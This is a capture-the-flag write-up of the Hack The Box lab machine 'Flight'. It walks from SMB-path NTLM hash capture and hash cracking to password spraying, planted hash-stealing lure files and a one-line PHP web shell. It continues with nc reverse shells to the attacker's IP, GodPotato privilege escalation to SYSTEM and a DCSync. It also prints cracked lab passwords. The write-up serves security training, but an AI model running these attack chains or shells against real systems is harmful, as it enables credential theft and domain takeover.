# Flight

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sV -sC -T4 10.10.11.187
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 15:42 EST
Nmap scan report for 10.10.11.187
Host is up (0.059s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-04 03:42:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-04T03:42:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
```

We fuzz for directories and files

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ dirsearch -u http://flight.htb                   
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Downloads/reports/http_flight.htb/_25-12-03_15-46-58.txt

Target: http://flight.htb/

[15:46:58] Starting:                                                                                                                                                                                                                        
[15:46:59] 403 -  299B  - /%C0%AE%C0%AE%C0%AF                               
[15:46:59] 301 -  329B  - /js  ->  http://flight.htb/js/                    
[15:46:59] 403 -  299B  - /%3f/                                             
[15:46:59] 403 -  299B  - /%ff                                              
[15:47:01] 403 -  299B  - /.ht_wsr.txt                                      
[15:47:01] 403 -  299B  - /.htaccess.orig                                   
[15:47:01] 403 -  299B  - /.htaccess.bak1
[15:47:01] 403 -  299B  - /.htaccess.sample
[15:47:01] 403 -  299B  - /.htaccessBAK                                     
[15:47:01] 403 -  299B  - /.htaccess_extra                                  
[15:47:01] 403 -  299B  - /.htaccess.save
[15:47:01] 403 -  299B  - /.htaccessOLD
[15:47:01] 403 -  299B  - /.htaccess_sc                                     
[15:47:01] 403 -  299B  - /.htaccess_orig
[15:47:01] 403 -  299B  - /.htaccessOLD2                                    
[15:47:01] 403 -  299B  - /.htm
[15:47:01] 403 -  299B  - /.html                                            
[15:47:01] 403 -  299B  - /.htpasswd_test                                   
[15:47:01] 403 -  299B  - /.htpasswds
[15:47:01] 403 -  299B  - /.httr-oauth                                      
[15:47:12] 403 -  299B  - /cgi-bin/                                         
[15:47:12] 200 -    2KB - /cgi-bin/printenv.pl
```

Accessing the `cgi-bin/printenv.pl` file, we get the following. We see the username `svc_apache`.

```shellscript
COMSPEC="C:\Windows\system32\cmd.exe"
CONTEXT_DOCUMENT_ROOT="/xampp/cgi-bin/"
CONTEXT_PREFIX="/cgi-bin/"
DOCUMENT_ROOT="C:/xampp/htdocs/flight.htb"
GATEWAY_INTERFACE="CGI/1.1"
HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
HTTP_ACCEPT_ENCODING="gzip, deflate"
HTTP_ACCEPT_LANGUAGE="en-US,en;q=0.5"
HTTP_CONNECTION="keep-alive"
HTTP_HOST="flight.htb"
HTTP_PRIORITY="u=0, i"
HTTP_UPGRADE_INSECURE_REQUESTS="1"
HTTP_USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
MIBDIRS="/xampp/php/extras/mibs"
MYSQL_HOME="\xampp\mysql\bin"
OPENSSL_CONF="/xampp/apache/bin/openssl.cnf"
PATH="C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\svc_apache\AppData\Local\Microsoft\WindowsApps"
PATHEXT=".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
PHPRC="\xampp\php"
PHP_PEAR_SYSCONF_DIR="\xampp\php"
QUERY_STRING=""
REMOTE_ADDR="10.10.16.3"
REMOTE_PORT="35582"
REQUEST_METHOD="GET"
REQUEST_SCHEME="http"
REQUEST_URI="/cgi-bin/printenv.pl"
SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
SCRIPT_NAME="/cgi-bin/printenv.pl"
SERVER_ADDR="10.10.11.187"
SERVER_ADMIN="postmaster@localhost"
SERVER_NAME="flight.htb"
SERVER_PORT="80"
SERVER_PROTOCOL="HTTP/1.1"
SERVER_SIGNATURE="<address>Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at flight.htb Port 80</address>\n"
SERVER_SOFTWARE="Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1"
SYSTEMROOT="C:\Windows"
TMP="\xampp\tmp"
WINDIR="C:\Windows"

```

We can try to see if the username is valid and maybe it is AS-REP Roastable. The user exists but is not vulnerable

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ kerbrute userenum -d flight.htb user --dc G0.flight.htb 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 12/03/25 - Ronnie Flathers @ropnop

2025/12/03 15:50:50 >  Using KDC(s):
2025/12/03 15:50:50 >   G0.flight.htb:88

2025/12/03 15:50:50 >  [+] VALID USERNAME:       svc_apache@flight.htb
```

Fuzzing for vhosts, we find school.

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://flight.htb -H 'Host: FUZZ.flight.htb' -fs 7069

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7069
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 97ms]
```

We find a school aviation page. Looking at the URL, we can attempt LFI

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FdFR0wjZx5LbalEJUTwjN%2Fimage.png?alt=media&#x26;token=b459541f-394a-4d70-9497-0d5ff9b60d2f" alt=""><figcaption></figcaption></figure>

Trying different payloads, we see that there is a blacklist in place on the `..` and some keywords like `filter`. Trying different bypasses don't work

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FvUTEFiDjR1VopMa7kGxg%2Fimage.png?alt=media&#x26;token=356ebc39-a54a-484c-a893-3e8bb2f256a1" alt=""><figcaption></figcaption></figure>

Next we can try for RFI. Putting our server address we get a connection

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FZlZ4mE7IHFwNDz7pcQmO%2Fimage.png?alt=media&#x26;token=f4bd50d6-2f32-459b-bde3-7b5a659a082b" alt=""><figcaption></figcaption></figure>

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.187 - - [03/Dec/2025 17:17:39] "GET / HTTP/1.1" 200 -
```

RFI doesn't work either. We can get code execution. As it is a windows server, we can leverage that RFI to capture the NTLMv2 hash of the service account running the server

In the view parameter, make a call to `//<ATTACKER_IP>/<SHARE>`

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo responder -I tun0 -w -d

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:93e81b63d1fcd055:F28590D6ED0FA9E49E4246A975E75149:010100000000000000DBB1A97C64DC010BB6FCA77455C32E00000000020008004A0035004C00530001001E00570049004E002D004D004500530042004900560030005A0041005200430004003400570049004E002D004D004500530042004900560030005A004100520043002E004A0035004C0053002E004C004F00430041004C00030014004A0035004C0053002E004C004F00430041004C00050014004A0035004C0053002E004C004F00430041004C000700080000DBB1A97C64DC0106000400020000000800300030000000000000000000000000300000292AC75DED2C03FD82E82AC2CA9EB5308D1A87DE2645AE9AC2BD01A5EEC38B230A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
```

We can now attempt to crack that hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 5600 'svc_apache::flight:93e81b63d1fcd055:F28590D6ED0FA9E49E4246A975E75149:010100000000000000DBB1A97C64DC010BB6FCA77455C32E00000000020008004A0035004C00530001001E00570049004E002D004D004500530042004900560030005A0041005200430004003400570049004E002D004D004500530042004900560030005A004100520043002E004A0035004C0053002E004C004F00430041004C00030014004A0035004C0053002E004C004F00430041004C00050014004A0035004C0053002E004C004F00430041004C000700080000DBB1A97C64DC0106000400020000000800300030000000000000000000000000300000292AC75DED2C03FD82E82AC2CA9EB5308D1A87DE2645AE9AC2BD01A5EEC38B230A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000' /usr/share/wordlists/rockyou.txt

svc_apache:S@Ss!K@*t13
```

We can try the credentials

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb G0.flight.htb -u svc_apache -p 'S@Ss!K@*t13'
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13
```

List the shares

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb G0.flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares 
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [*] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ            
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ
```

Looking at the shares reveals nothing interesting. Same for bloodhound, our user is not part of any interesting groups or has any outbound control. We can try to get a user list and spray the password hoping for reuse

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb G0.flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --users | awk '{print $5}'
[*]
[+]
-Username-
Administrator
Guest
krbtgt
S.Moon
R.Cold
G.Lors
L.Kein
M.Gold
C.Bum
W.Walker
I.Francis
D.Truff
V.Stevens
svc_apache
O.Possum
[*]
```

Spray : `S.Moon:S@Ss!K@*t13`

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb G0.flight.htb -u users -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

S.Moon has write access on the Shared file. It is probably a shared folder with other users. We can try to write a .lnk file to grab a user's hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb G0.flight.htb -u 's.moon' -p 'S@Ss!K@*t13' --shares            
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.187    445    G0               [+] flight.htb\s.moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [*] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ
```

We are unable to upload scf or lnk files to the share. Probably because of an extension blacklist. We don't know which file will work, so we can use a tool that creates all the possible types and then we can upload all and see if we get to capture a hash

```shellscript
┌──(kali㉿kali)-[~/Downloads/test/ntlm_theft]
└─$ python3 ntlm_theft.py -g all -s 10.10.16.3 -f test                                            
/home/kali/Downloads/test/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Created: test/test.lnk (BROWSE TO FOLDER)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test-(externalcell).xlsx (OPEN)
Created: test/test.wax (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: test/test.library-ms (BROWSE TO FOLDER)
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Created: test/test.theme (THEME TO INSTALL
Generation Complete.
```

We try to upload all of them

Running responder, we get a hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo responder -I tun0 -w -v

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:a56d7b59bcebc14e:0A360ED5ED7FFBF84A7AAFC906F09314:01010000000000008028BAB78964DC019444B5BB5ADAF67800000000020008004D0059003900540001001E00570049004E002D004D003200390042005500440055004F0057003300330004003400570049004E002D004D003200390042005500440055004F005700330033002E004D005900390054002E004C004F00430041004C00030014004D005900390054002E004C004F00430041004C00050014004D005900390054002E004C004F00430041004C00070008008028BAB78964DC0106000400020000000800300030000000000000000000000000300000292AC75DED2C03FD82E82AC2CA9EB5308D1A87DE2645AE9AC2BD01A5EEC38B230A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000
```

Crack the hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 5600 'c.bum::flight.htb:a56d7b59bcebc14e:0A360ED5ED7FFBF84A7AAFC906F09314:01010000000000008028BAB78964DC019444B5BB5ADAF67800000000020008004D0059003900540001001E00570049004E002D004D003200390042005500440055004F0057003300330004003400570049004E002D004D003200390042005500440055004F005700330033002E004D005900390054002E004C004F00430041004C00030014004D005900390054002E004C004F00430041004C00050014004D005900390054002E004C004F00430041004C00070008008028BAB78964DC0106000400020000000800300030000000000000000000000000300000292AC75DED2C03FD82E82AC2CA9EB5308D1A87DE2645AE9AC2BD01A5EEC38B230A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000' /usr/share/wordlists/rockyou.txt

c.bum:Tikkycoll_431012284
```

He has write access on the Web share

```shellscript
┌──(kali㉿kali)-[~/Downloads/test/ntlm_theft/test]
└─$ nxc smb G0.flight.htb -u 'c.bum' -p 'Tikkycoll_431012284' --shares                                                     
SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.10.11.187    445    G0               [*] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ,WRITE
```

We can get the user flag

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient \\\\G0.flight.htb\\Users -U 'c.bum%Tikkycoll_431012284'
```

We have write on the Web share which hosts the website files. We know the vhost school.flight.htb uses PHP. We can write a web shell and interact with it

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient \\\\G0.flight.htb\\Web -U 'c.bum%Tikkycoll_431012284'

smb: \school.flight.htb\> put shell.php 
putting file shell.php as \school.flight.htb\shell.php (0.1 kb/s) (average 0.1 kb/s)
```

Interact with the web shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fv5lHK9rFw0gu2znpbFZA%2Fimage.png?alt=media&#x26;token=37eaa549-567b-44bf-ba65-4906bc9630fe" alt=""><figcaption></figcaption></figure>

Next the goal is to get a reverse shell

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Ft5o4pr8xa92viStQE4Vd%2Fimage.png?alt=media&#x26;token=9965418b-ef81-4388-9926-ad842401900c" alt=""><figcaption></figcaption></figure>

```shellscript
┌──(kali㉿kali)-[~/Downloads/test/ntlm_theft/test]
└─$ nc -lnvp 9001                    
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.187] 50520
Windows PowerShell running as user svc_apache on G0
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\school.flight.htb>whoami
flight\svc_apache
```

We know the credentials for c.bum, so we upload runascs and get a shell as that user

```shellscript
PS C:\users\svc_apache> .\RunasCs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.16.3:443
[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5e4b4$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2868 created in background.
```

In the root folder, we see an inetpub folder, indicating that an IIS webserver should be running on the host.

```shellscript
PS C:\> ls 
ls 


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        12/4/2025  12:47 AM                inetpub                                                               
d-----         6/7/2022   6:39 AM                PerfLogs                                                              
d-r---       10/21/2022  11:49 AM                Program Files                                                         
d-----        7/20/2021  12:23 PM                Program Files (x86)                                                   
d-----        12/3/2025  11:31 PM                Shared                                                                
d-----        9/22/2022  12:28 PM                StorageReports                                                        
d-r---        9/22/2022   1:16 PM                Users                                                                 
d-----       10/21/2022  11:52 AM                Windows                                                               
d-----        9/22/2022   1:16 PM                xampp
```

Checking the ports, we find port 8000 open, which is not common, and it was not listed on our nmap result. A firewall must be blocking it from the outside

```shellscript
PS C:\> netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4660
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       928
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4660
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       928
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
```

We can try to forward that port to our machine. We can use chisel

```shellscript
# On our attacker machine
┌──(kali㉿kali)-[~/Downloads]
└─$ ./chisel_1.11.3_linux_amd64 server -p 8001 --reverse

# On the target
PS C:\users\C.bum> .\chisel.exe client 10.10.16.3:8001 R:8000:127.0.0.1:8000
.\chisel.exe client 10.10.16.3:8001 R:8000:127.0.0.1:8000
2025/12/04 17:08:08 client: Connecting to ws://10.10.16.3:8001
2025/12/04 17:08:09 client: Connected (Latency 32.4901ms)
```

C.bum has write privileges over the server, so we can write a web shell. It is IIS so we will use an aspx shell

```shellscript
PS C:\inetpub\development> iwr http://10.10.16.3:80/rev.aspx -o rev.aspx
```

Access it via the browser and get the shell

```shellscript
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

The user has the SeImpersonatePrivilege enabled.

```shellscript
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Transfer a potato and nc to the target and grab a SYSTEM shell

```shellscript
PS C:\Users\Public> .\GodPotato-NET4.exe -cmd "cmd /c whoami"
nt authority\system

PS C:\Users\Public> .\GodPotato-NET4.exe -cmd "cmd /c C:\Users\Public\nc.exe -e cmd.exe 10.10.16.3 9002"


┌──(kali㉿kali)-[/opt/windows]
└─$ nc -lnvp 9002                                                     
listening on [any] 9002 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.187] 49853
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public>whoami
whoami
nt authority\system
```

There is also a second way to become system. We see that we get a shell as `iis apppool\defaultapppool`. It is a Microsoft Virtual Account. One thing about these accounts is that when they authenticate over the network, they do so as the machine account.

```shellscript
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

For example, if I start `responder` and then try to open an SMB share on it (`net use \\10.10.14.6\doesntmatter`), the account I see trying to authenticate is flight\G0$:

```shellscript
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.187
[SMB] NTLMv2-SSP Username : flight\G0$
[SMB] NTLMv2-SSP Hash     : G0$::flight:1e589bf41238cf8e:547002306786919B6BB28F45BC6EEA4F:010100000000000080ADD9B1DBEAD801A1870276D7F4D729000000000200080052004F003500320001001E00570049004E002D00450046004B004A004B0059004500500037003900500004003400570049004E002D00450046004B004A004B005900450050003700390050002E0052004F00350032002E004C004F00430041004C000300140052004F00350032002E004C004F00430041004C000500140052004F00350032002E004C004F00430041004C000700080080ADD9B1DBEAD80106000400020000000800300030000000000000000000000000300000B1315E28BC96528147F3929B329DC4FE9D27ADEB96DF3BCF9F6C892CCB4443D80A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```

I won’t be able to crack that NetNTLMv2 because the machine accounts use long random passwords. But it does show that the defaultapppool account is authenticating as the machine account.

Abusing that behavior, we can use Rubeus to get a ticket and DCSync

```shellscript
# Get a TGT for the machine account
.\rubeus.exe tgtdeleg /nowrap

# Convert the kirbi file to ccache for linux use
kirbi2ccache ticket.kirbi ticket.ccache 

# Export the ticket 
export KRB5CCNAME=ticket.ccache 
 
# DCSync
secretsdump.py -k -no-pass g0.flight.htb
```
